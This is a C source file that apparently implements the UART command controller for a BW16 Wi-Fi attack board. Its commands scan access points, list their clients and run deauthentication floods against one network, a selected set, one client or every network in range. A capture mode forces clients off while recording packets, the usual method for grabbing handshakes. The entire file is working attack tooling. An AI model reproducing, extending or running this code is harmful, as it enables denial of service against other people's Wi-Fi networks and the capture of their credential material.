/* SPDX-License-Identifier: GPL-3.0-or-later */
#include "bw16_native.h"
#include <limits.h>
#include <stdio.h>
#include <string.h>

static const uint8_t broadcast[6] = {255,255,255,255,255,255};
static bool active(const BwnController* c) {
    return c->state == BwnStation || c->state == BwnClient ||
           c->state == BwnAll || c->state == BwnSelected;
}
static void emit(BwnController* c, const char* s) { if(c->io.emit) c->io.emit(c->context, s); }
static void error(BwnController* c, const char* s) {
    char line[80]; snprintf(line, sizeof(line), "ERR %s", s); emit(c, line);
}
static void count_line(BwnController* c) {
    char line[40];
    snprintf(line, sizeof(line), c->state == BwnAll ? "CYCLES: %lu" : "TX:%lu",
             (unsigned long)(c->state == BwnAll ? c->cycles : c->counter));
    emit(c, line);
}
static bool mac_valid(const uint8_t m[6]) {
    static const uint8_t zero[6] = {0};
    return !(m[0] & 1U) && memcmp(m, zero, 6) != 0;
}
static bool channel_valid(unsigned ch) {
    return (ch >= 1 && ch <= 14) || (ch >= 32 && ch <= 144 && ch % 4 == 0) ||
           (ch >= 149 && ch <= 177 && (ch - 149) % 4 == 0) ||
           (ch >= 184 && ch <= 196 && ch % 4 == 0);
}
static void mac_text(const uint8_t m[6], char out[13]) {
    snprintf(out, 13, "%02X%02X%02X%02X%02X%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}
static void ap_line(BwnController* c, const BwnAp* ap, bool indexed) {
    char line[90], mac[13]; mac_text(ap->mac, mac);
    snprintf(line, sizeof(line), "%s%s,%u,%s,%d", indexed ? "list-station:" : "",
             ap->ssid[0] ? ap->ssid : "HIDDEN NETWORK", ap->channel, mac, ap->rssi);
    emit(c, line);
}
static void station_list(BwnController* c) {
    emit(c, "LIST_STATION_START");
    for(unsigned i = 0; i < c->ap_count; ++i) ap_line(c, &c->aps[i], true);
    c->indices_valid = true;
    emit(c, "LIST_STATION_DONE");
}
void bwn_init(BwnController* c, const BwnIo* io, void* context) {
    memset(c, 0, sizeof(*c)); if(io) c->io = *io; c->context = context;
}
void bwn_stop(BwnController* c) {
    if(c->state == BwnCapture) {
        c->capture_deauth_pending = false;
        if(c->io.capture_end) c->io.capture_end(c->context);
        char line[80];
        snprintf(line, sizeof(line), "CAPTURE_STATS:%08lX:%lu:%lu",
                 (unsigned long)c->capture_session, (unsigned long)c->capture_emitted,
                 (unsigned long)c->capture_dropped);
        emit(c, line);
        snprintf(line, sizeof(line), "CAPTURE_DONE:%08lX", (unsigned long)c->capture_session);
        c->state = BwnIdle; emit(c, line);
    } else if(active(c)) {
        count_line(c);
        const char* done = c->state == BwnSelected ? "SELECTED_DONE" :
                           c->state == BwnAll ? "DEAUTH_ALL_STOPPED" : "TARGETED_DONE";
        c->state = BwnIdle; c->channel_ready = false;
        emit(c, done);
    } else if(c->state == BwnObserve) {
        if(c->io.observe_end) c->io.observe_end(c->context);
        c->state = BwnIdle; c->clients_valid = false;
        error(c, "CLIENT_LIST_STOPPED");
    } else if(c->state == BwnScan) {
        c->state = BwnIdle; c->scan_valid = c->indices_valid = false;
        error(c, "SCAN_STOPPED");
    }
}
static bool decimal(const char** text, unsigned* result) {
    const char* p = *text; unsigned n = 0;
    if(*p < '0' || *p > '9') return false;
    do {
        if(n > 1000U) return false;
        n = n * 10U + (unsigned)(*p++ - '0');
    } while(*p >= '0' && *p <= '9');
    *result = n; *text = p; return true;
}
static bool one_index(const char* s, unsigned* index) {
    return decimal(&s, index) && *s == 0;
}
static bool two_indices(const char* s, unsigned* ap, unsigned* client) {
    if(!decimal(&s, ap) || *s++ != ' ') return false;
    return decimal(&s, client) && *s == 0;
}
static bool capture_args(const char* s, unsigned* ap, uint32_t* session) {
    if(!decimal(&s, ap) || *s++ != ' ' || strlen(s) != 8) return false;
    uint32_t value = 0;
    for(unsigned i = 0; i < 8; ++i) {
        unsigned digit = s[i] >= '0' && s[i] <= '9' ? (unsigned)(s[i] - '0') :
                         s[i] >= 'a' && s[i] <= 'f' ? (unsigned)(s[i] - 'a' + 10) :
                         s[i] >= 'A' && s[i] <= 'F' ? (unsigned)(s[i] - 'A' + 10) : 16;
        if(digit > 15) return false;
        value = (value << 4) | digit;
    }
    *session = value; return value != 0;
}
static bool valid_cache(BwnController* c) {
    return c->scan_valid && c->indices_valid && c->ap_count > 0 && c->ap_count <= BWN_MAX_APS;
}
static void begin_scan(BwnController* c, bool list, uint32_t now) {
    c->scan_valid = c->indices_valid = c->clients_valid = false;
    c->ap_count = c->client_count = 0; c->list_after_scan = list;
    c->state = BwnScan; c->started = now;
    if(!c->io.scan_begin || !c->io.scan_begin(c->context)) {
        c->state = BwnIdle; error(c, "SCAN_FAILED");
    }
}
static bool snapshot(BwnController* c, uint64_t mask) {
    if(!valid_cache(c) || !mask || (mask >> c->ap_count)) return false;
    for(unsigned i = 0; i < c->ap_count; ++i)
        if((mask & ((uint64_t)1 << i)) &&
           (!mac_valid(c->aps[i].mac) || !channel_valid(c->aps[i].channel))) return false;
    c->target_count = 0;
    for(unsigned i = 0; i < c->ap_count; ++i) if(mask & ((uint64_t)1 << i)) {
        c->targets[c->target_count] = c->aps[i];
        c->target_indices[c->target_count++] = (uint8_t)i;
    }
    return true;
}
static void start(BwnController* c, BwnState state, uint32_t now) {
    c->state = state; c->started = c->visit_started = c->report_started = now;
    c->counter = c->cycles = 0; c->position = 0;
    c->channel_ready = c->all_waiting = c->visit_sent = false;
    emit(c, state == BwnSelected ? "SELECTED_START" :
            state == BwnAll ? "DEAUTH_ALL_START" : "TARGETED_START");
}
void bwn_command(BwnController* c, const char* line, uint32_t now) {
    unsigned ap, client;
    if(strcmp(line, "STOP") == 0 || strcmp(line, "stop") == 0) { bwn_stop(c); return; }
    if(strcmp(line, "BW16_CAPS") == 0) {
        emit(c, "BW16_PCAP:1"); emit(c, "BW16_PCAP_DEAUTH:1"); emit(c, "BW16_CAPS:1"); return;
    }
    if(c->state != BwnIdle) { error(c, "BUSY"); return; }
    if(strcmp(line, "SCAN") == 0) { begin_scan(c, false, now); return; }
    if(strcmp(line, "DEAUTH_STATION") == 0) {
        if(c->scan_valid) station_list(c); else begin_scan(c, true, now);
        return;
    }
    const bool capture_with_deauth = strncmp(line, "CAPTURE_DEAUTH ", 15) == 0;
    if(capture_with_deauth || strncmp(line, "CAPTURE ", 8) == 0) {
        uint32_t session;
        if(!capture_args(line + (capture_with_deauth ? 15 : 8), &ap, &session) ||
           ap >= BWN_MAX_APS || !snapshot(c, (uint64_t)1 << ap)) {
            error(c, "INVALID_CAPTURE"); return;
        }
        c->capture_session = session; c->capture_emitted = c->capture_dropped = 0;
        c->capture_complete = c->capture_deauth_pending = false;
        c->capture_with_deauth = capture_with_deauth; c->started = now; c->state = BwnCapture;
        if(!c->io.capture_begin || !c->io.capture_end ||
           (capture_with_deauth && !c->io.capture_deauth) ||
           !c->io.capture_begin(c->context, &c->targets[0], session)) {
            c->state = BwnIdle; error(c, "CAPTURE_FAILED"); return;
        }
        c->capture_deauth_pending = capture_with_deauth;
        char text[40]; snprintf(text, sizeof(text), "CAPTURE_START:%08lX", (unsigned long)session);
        emit(c, text); return;
    }
    if(strncmp(line, "LIST_CLIENTS ", 13) == 0) {
        if(!one_index(line + 13, &ap) || !valid_cache(c) || ap >= c->ap_count) {
            error(c, "INVALID_AP"); return;
        }
        c->clients_valid = false; c->client_count = 0; c->client_ap = ap;
        c->state = BwnObserve; c->started = now;
        if(!c->io.observe_begin || !c->io.observe_begin(c->context, &c->aps[ap])) {
            c->state = BwnIdle; error(c, "OBSERVE_FAILED");
        }
        return;
    }
    memcpy(c->destination, broadcast, sizeof(broadcast));
    if(strncmp(line, "DEAUTH_SELECTED ", 16) == 0) {
        const char* s = line + 16; uint64_t mask = 0;
        if(strlen(s) != 13) { error(c, "INVALID_MASK"); return; }
        for(unsigned i = 0; i < 13; ++i) {
            unsigned v = s[i] >= '0' && s[i] <= '9' ? (unsigned)(s[i] - '0') :
                         s[i] >= 'a' && s[i] <= 'f' ? (unsigned)(s[i] - 'a' + 10) :
                         s[i] >= 'A' && s[i] <= 'F' ? (unsigned)(s[i] - 'A' + 10) : 16;
            if(v > 15) { error(c, "INVALID_MASK"); return; }
            mask = (mask << 4) | v;
        }
        if(!snapshot(c, mask)) { error(c, "INVALID_SELECTION"); return; }
        start(c, BwnSelected, now); return;
    }
    if(strncmp(line, "DEAUTH_STATION ", 15) == 0) {
        if(!one_index(line + 15, &ap) || ap >= BWN_MAX_APS || !snapshot(c, (uint64_t)1 << ap)) {
            error(c, "INVALID_AP"); return;
        }
        start(c, BwnStation, now); return;
    }
    if(strncmp(line, "DEAUTH_CLIENT ", 14) == 0) {
        if(!two_indices(line + 14, &ap, &client) || !c->clients_valid ||
           ap != c->client_ap || ap >= BWN_MAX_APS || client >= c->client_count ||
           !snapshot(c, (uint64_t)1 << ap)) { error(c, "INVALID_CLIENT"); return; }
        memcpy(c->destination, c->clients[client], 6);
        start(c, BwnClient, now); return;
    }
    if(strcmp(line, "DEAUTH_ALL") == 0) {
        if(!valid_cache(c) || !snapshot(c, ((uint64_t)1 << c->ap_count) - 1)) {
            error(c, "NO_SCAN_RESULTS"); return;
        }
        start(c, BwnAll, now); return;
    }
    error(c, "UNKNOWN_COMMAND");
}
void bwn_feed(BwnController* c, uint8_t byte, uint32_t now) {
    if(byte == '\n') {
        if(c->rx_discard) { c->rx_discard = false; c->rx_used = 0; return; }
        if(c->rx_used && c->rx[c->rx_used - 1] == '\r') --c->rx_used;
        c->rx[c->rx_used] = 0;
        unsigned length = c->rx_used; c->rx_used = 0;
        if(length) bwn_command(c, c->rx, now);
        return;
    }
    if(c->rx_discard) return;
    if(!c->rx_used) c->rx_started = now;
    if((byte < 32 && byte != '\r') || byte > 126 || c->rx_used >= BWN_LINE_SIZE - 1) {
        error(c, "UART_LINE_INVALID"); bwn_stop(c); c->rx_discard = true; c->rx_used = 0;
    } else c->rx[c->rx_used++] = (char)byte;
}
void bwn_scan_result(BwnController* c, const BwnAp* ap) {
    if(c->state != BwnScan || c->ap_count >= BWN_MAX_APS || !ap ||
       !mac_valid(ap->mac) || !channel_valid(ap->channel)) return;
    BwnAp* dest = &c->aps[c->ap_count++]; *dest = *ap; dest->ssid[32] = 0;
    for(unsigned i = 0; dest->ssid[i]; ++i)
        if((uint8_t)dest->ssid[i] < 32 || (uint8_t)dest->ssid[i] == 127) dest->ssid[i] = '?';
    if(dest->rssi > 0) dest->rssi = 0;
    if(dest->rssi < -127) dest->rssi = -127;
}
void bwn_scan_complete(BwnController* c, bool success) {
    if(c->state != BwnScan) return;
    c->state = BwnIdle; c->scan_valid = success;
    if(!success) { c->ap_count = 0; error(c, "SCAN_FAILED"); return; }
    if(c->list_after_scan) station_list(c);
    else {
        for(unsigned i = 0; i < c->ap_count; ++i) ap_line(c, &c->aps[i], false);
        emit(c, "SCAN_DONE");
    }
}
void bwn_client_result(BwnController* c, const uint8_t mac[6]) {
    if(c->state != BwnObserve || !mac_valid(mac) ||
       !memcmp(mac, c->aps[c->client_ap].mac, 6)) return;
    for(unsigned i = 0; i < c->client_count; ++i) if(!memcmp(c->clients[i], mac, 6)) return;
    if(c->client_count < BWN_MAX_CLIENTS) memcpy(c->clients[c->client_count++], mac, 6);
}
void bwn_capture_progress(BwnController* c, uint32_t emitted, uint32_t dropped, bool complete) {
    if(c->state != BwnCapture) return;
    c->capture_emitted = emitted; c->capture_dropped = dropped; c->capture_complete = complete;
}
bool bwn_client_from_frame(const uint8_t* frame, size_t length, const uint8_t bssid[6], uint8_t client[6]) {
    if(!frame || length < 24 || (frame[0] & 0x0f) != 0x08 || (frame[1] & 3U) == 3U) return false;
    const uint8_t* peer = !memcmp(frame + 4, bssid, 6) ? frame + 10 :
                          !memcmp(frame + 10, bssid, 6) ? frame + 4 : NULL;
    if(!peer || !mac_valid(peer) || !memcmp(peer, bssid, 6)) return false;
    memcpy(client, peer, 6); return true;
}
void bwn_tick(BwnController* c, uint32_t now) {
    if(c->rx_used && (uint32_t)(now - c->rx_started) >= 500U) {
        error(c, "UART_LINE_TIMEOUT"); bwn_stop(c); c->rx_used = 0; c->rx_discard = true;
    }
    if(c->state == BwnScan) {
        if((uint32_t)(now - c->started) >= 18000U) {
            c->state = BwnIdle; c->scan_valid = c->indices_valid = false;
            error(c, "SCAN_TIMEOUT");
        }
        return;
    }
    if(c->state == BwnObserve) {
        if((uint32_t)(now - c->started) >= 5000U) {
            if(c->io.observe_end) c->io.observe_end(c->context);
            c->state = BwnIdle; c->clients_valid = true;
            for(unsigned i = 0; i < c->client_count; ++i) {
                char line[26], mac[13]; mac_text(c->clients[i], mac);
                snprintf(line, sizeof(line), "list-client:%s", mac); emit(c, line);
            }
            emit(c, "LIST_CLIENTS_DONE");
        }
        return;
    }
    if(c->state == BwnCapture) {
        if(c->capture_complete || (uint32_t)(now - c->started) >= BWN_CAPTURE_MS) {
            bwn_stop(c); return;
        }
        if(c->capture_deauth_pending) {
            /* Consume before calling the adapter: never repeat or defer a stale burst. */
            c->capture_deauth_pending = false;
            unsigned attempts = 0;
            if(c->capture_with_deauth && (uint32_t)(now - c->started) < BWN_CAPTURE_DEAUTH_MS &&
               c->target_count == 1 && c->io.capture_deauth)
                attempts = c->io.capture_deauth(c->context, &c->targets[0]);
            if(attempts > 3U) attempts = 3U;
            char text[40];
            snprintf(text, sizeof(text), "CAPTURE_DEAUTH:%08lX:%u", (unsigned long)c->capture_session, attempts);
            emit(c, text);
        }
        return;
    }
    if(!active(c)) return;
    if((uint32_t)(now - c->started) >= BWN_OPERATION_MS) { bwn_stop(c); return; }
    if(c->state == BwnSelected &&
       (uint32_t)(now - c->visit_started) >= BWN_VISIT_MS) {
        c->position = (c->position + 1U) % c->target_count;
        c->visit_started = now; c->channel_ready = c->visit_sent = false;
    }
    if(c->state == BwnAll && c->all_waiting) {
        if((uint32_t)(now - c->visit_started) < 100U) return;
        c->all_waiting = false;
    }
    const BwnAp* ap = &c->targets[c->position];
    if(!c->channel_ready) {
        if(!c->io.set_channel || !c->io.set_channel(c->context, ap->channel)) {
            error(c, "CHANNEL_FAILED"); bwn_stop(c); return;
        }
        c->channel_ready = true;
    }
    if(!c->io.transmit) { error(c, "RADIO_UNAVAILABLE"); bwn_stop(c); return; }
    if(c->state == BwnAll) {
        c->io.transmit(c->context, ap->mac, c->destination, 7);
        if(c->counter != UINT32_MAX) ++c->counter;
        c->position = (c->position + 1U) % c->target_count; c->channel_ready = false;
        if(!c->position) {
            if(c->cycles != UINT32_MAX) ++c->cycles;
            c->all_waiting = true; c->visit_started = now;
        }
    } else if(c->state != BwnSelected || !c->visit_sent) {
        static const uint16_t reasons[3] = {1, 4, 16};
        for(unsigned i = 0; i < 3; ++i) {
            c->io.transmit(c->context, ap->mac, c->destination, reasons[i]);
            if(c->counter != UINT32_MAX) ++c->counter;
        }
        c->visit_sent = true;
    }
    if((uint32_t)(now - c->report_started) >= 250U) {
        count_line(c);
        if(c->state == BwnSelected) {
            char line[30]; snprintf(line, sizeof(line), "SELECTED_AP:%u", c->target_indices[c->position]);
            emit(c, line);
        }
        c->report_started = now;
    }
}
